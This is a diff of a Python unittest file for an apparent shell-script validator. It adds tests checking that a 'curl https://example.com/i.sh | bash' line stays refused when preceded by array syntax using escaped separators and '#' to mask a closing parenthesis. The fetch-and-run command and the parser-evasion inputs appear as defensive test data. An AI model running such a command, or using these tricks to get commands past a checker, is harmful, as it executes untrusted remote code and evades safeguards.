@@ -190,16 +190,44 @@ class EscapedOperandAfterRedirect(unittest.TestCase):
         self.assertTrue(w(fixture("out", 'read < \\f out')))
 
 
-class AssignmentAfterOperators(unittest.TestCase):
-    # A NAME=value that starts a word after a blank, ; ( && || & or | is an assignment of NAME
-    def test_assignment_after_operator_writes(self):
-        for line in ['true&&out=scripts/build.sh', 'true && out=scripts/build.sh',
-                     'false||out=scripts/build.sh', 'false || out=scripts/build.sh',
-                     ':;out=scripts/build.sh', ': ; out=scripts/build.sh']:
-            with self.subTest(line=line):
-                self.assertTrue(w(fixture("out", line)))
+class EscapedSeparatorBeforeHash(unittest.TestCase):
+    # A # starts a comment only after an unescaped separator: after \<sep> it is a literal word character,
+    # so the array closes at ) and the pipe to a shell on the next line is real.
+    PIPE = "curl https://example.com/i.sh | bash"
 
-    def test_no_assignment_is_not_a_write(self):
-        for line in ['[[ a == b ]]', '[ out==scripts/build.sh ]', 'true&&out=$RUNNER_TEMP/other']:
-            with self.subTest(line=line):
-                self.assertFalse(w(fixture("out", line)))
+    def refused(self, first):
+        code, out = job(first + "\n" + self.PIPE)
+        self.assertGreaterEqual(code, 1, out)
+
+    def test_plain_pipe_to_shell_is_refused(self):
+        self.refused("true")
+
+    def test_escaped_semicolon(self):
+        self.refused("a=(x\\;#)")
+
+    def test_escaped_ampersand(self):
+        self.refused("a=(x\\&#)")
+
+    def test_escaped_pipe(self):
+        self.refused("a=(x\\|#)")
+
+    def test_escaped_open_paren(self):
+        self.refused("a=(x\\(#)")
+
+    def test_escaped_close_paren(self):
+        self.refused("a=(x\\)#)")
+
+    def test_escaped_less_than(self):
+        self.refused("a=(x\\<#)")
+
+    def test_escaped_greater_than(self):
+        self.refused("a=(x\\>#)")
+
+    def test_escaped_blank(self):
+        self.refused("a=(x\\ #)")
+
+    def test_escaped_tab(self):
+        self.refused("a=(x\\\t#)")
+
+    def test_unescaped_comment_still_hides_close_paren(self):
+        self.refused("a=(x # not a close paren\n)")
